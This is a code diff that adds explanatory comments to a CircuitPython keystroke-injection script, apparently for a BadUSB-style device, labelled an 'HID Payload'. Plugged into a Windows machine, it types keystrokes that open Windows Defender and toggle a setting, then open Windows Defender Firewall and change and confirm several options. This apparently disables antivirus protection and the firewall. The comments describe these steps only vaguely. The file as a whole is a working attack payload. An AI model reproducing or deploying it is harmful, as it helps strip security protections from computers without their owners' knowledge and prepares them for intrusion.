@@ -1,3 +1,10 @@
+# -----------------------------
+# HID Payload Automation Script
+# Author: Elton Lewis (theGhostKey)
+# Description: Automates opening and navigating through
+# Windows Defender and Windows Firewall using keyboard inputs.
+# -----------------------------
+
 import time
 import board
 import usb_hid
@@ -6,37 +13,60 @@ from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
 from adafruit_hid.keycode import Keycode
 from adafruit_hid.mouse import Mouse
 
+# Initialize keyboard and mouse HID devices
 kbd = Keyboard(usb_hid.devices)
 layout = KeyboardLayoutUS(kbd)
-mouse=Mouse(usb_hid.devices)
+mouse = Mouse(usb_hid.devices)
+
+# Small delay before starting (to let the OS detect the device)
 time.sleep(2)
 
-kbd.send(Keycode.GUI)
+# -----------------------------
+# Step 1: Open Windows Start Menu
+# -----------------------------
+kbd.send(Keycode.GUI)  # Press the Windows key to open Start menu
 time.sleep(2)
-layout.write("Windows Defender");
+
+# -----------------------------
+# Step 2: Search for Windows Defender
+# -----------------------------
+layout.write("Windows Defender")  # Type "Windows Defender" in the Start menu
 time.sleep(1.5)
-kbd.send(Keycode.ENTER)
+kbd.send(Keycode.ENTER)  # Press Enter to open it
 time.sleep(1.5)
+
+# In case of additional confirmation or focus windows
 kbd.send(Keycode.ENTER)
+# Navigate using Tab keys (simulates keyboard focus movement)
 kbd.send(Keycode.TAB)
 kbd.send(Keycode.TAB)
 kbd.send(Keycode.TAB)
 kbd.send(Keycode.TAB)
 kbd.send(Keycode.ENTER)
 time.sleep(1)
+
+# Perform some toggle operation (like enabling/disabling a feature)
 kbd.send(Keycode.SPACE)
 time.sleep(1)
 kbd.send(Keycode.LEFT_ARROW)
 kbd.send(Keycode.ENTER)
 time.sleep(1)
+
+# Close Windows Defender
 kbd.send(Keycode.ALT, Keycode.F4)
 time.sleep(2)
-kbd.send(Keycode.GUI)
+
+# -----------------------------
+# Step 3: Open Windows Defender Firewall
+# -----------------------------
+kbd.send(Keycode.GUI)  # Open Start again
 time.sleep(1)
-layout.write("Windows Defender Firewall");
+layout.write("Windows Defender Firewall")
 time.sleep(1.5)
 kbd.send(Keycode.ENTER)
 time.sleep(1.5)
+
+# Navigate using Tab to reach a specific button or option
 kbd.send(Keycode.TAB)
 kbd.send(Keycode.TAB)
 kbd.send(Keycode.TAB)
@@ -47,6 +77,8 @@ kbd.send(Keycode.TAB)
 kbd.send(Keycode.TAB)
 kbd.send(Keycode.ENTER)
 time.sleep(1.5)
+
+# Continue navigation (these may simulate changing firewall settings)
 kbd.send(Keycode.TAB)
 kbd.send(Keycode.TAB)
 kbd.send(Keycode.TAB)
@@ -58,11 +90,17 @@ kbd.send(Keycode.DOWN_ARROW)
 kbd.send(Keycode.DOWN_ARROW)
 kbd.send(Keycode.DOWN_ARROW)
 time.sleep(1.5)
+
+# Adjust more options
 kbd.send(Keycode.TAB)
 kbd.send(Keycode.DOWN_ARROW)
 kbd.send(Keycode.DOWN_ARROW)
 kbd.send(Keycode.DOWN_ARROW)
 kbd.send(Keycode.TAB)
 time.sleep(1)
+
+# Apply or confirm changes
 kbd.send(Keycode.ENTER)
+
+# Close the window
 kbd.send(Keycode.ALT, Keycode.F4)
